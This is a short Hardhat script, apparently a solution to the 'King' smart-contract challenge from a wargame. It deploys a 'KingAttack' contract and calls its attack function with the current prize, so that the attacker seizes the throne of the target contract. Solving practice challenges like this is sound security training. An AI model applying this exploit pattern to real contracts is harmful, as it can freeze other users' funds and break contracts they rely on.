import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x05242D4AC717Cdf38C36AF290F2b0DA99AA82c67";
const PLAYER_ADDRESS = "0x976EA74026E726554dB657fA54763abd0C3a0aa9";

async function main() {
    const signer = await ethers.getSigner(PLAYER_ADDRESS);
    const contract = await ethers.getContractAt("King", CONTRACT_ADDRESS, signer);

    const attackerFactory = await ethers.getContractFactory("KingAttack");
    const attackerContract = await attackerFactory.deploy();

    const currentPrize = await contract.prize();
    const currentPrizeInt = currentPrize.toNumber();
    
    attackerContract.attack(CONTRACT_ADDRESS, { value: currentPrizeInt });
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
